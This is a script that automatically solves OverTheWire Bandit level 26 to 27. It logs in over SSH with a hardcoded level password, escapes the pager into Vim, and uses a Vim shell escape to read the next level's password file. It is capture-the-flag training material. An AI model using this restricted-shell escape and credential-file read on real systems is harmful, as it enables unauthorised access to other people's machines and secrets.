print("[*] Bandit Level 26 -> 27: Shell Command Execution")

let pass = "s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ"

print("[*] Connecting...")
let ssh = connect_ssh_pty("bandit.labs.overthewire.org", 2220, "bandit26", pass, 3, 20)
ssh_interactive_start(ssh)

print("[*] Wait for --More-- and enter Vim")
let initial = ssh_interactive_recv(ssh, 1500)
ssh_interactive_send(ssh, "v")
let vim_start = ssh_interactive_recv(ssh, 1000)

print("[*] Press ENTER past startup")
ssh_interactive_send(ssh, "\r")
let vim_ready = ssh_interactive_recv(ssh, 500)

print("[*] Execute shell command to cat password")
ssh_interactive_send(ssh, ":!cat /etc/bandit_pass/bandit27\r")
let shell_output = ssh_interactive_recv(ssh, 1500)

print("\n========== SHELL OUTPUT ==========")
print(shell_output)
print("==================================\n")

ssh_interactive_close(ssh)
print("[+] Check output above for password!")
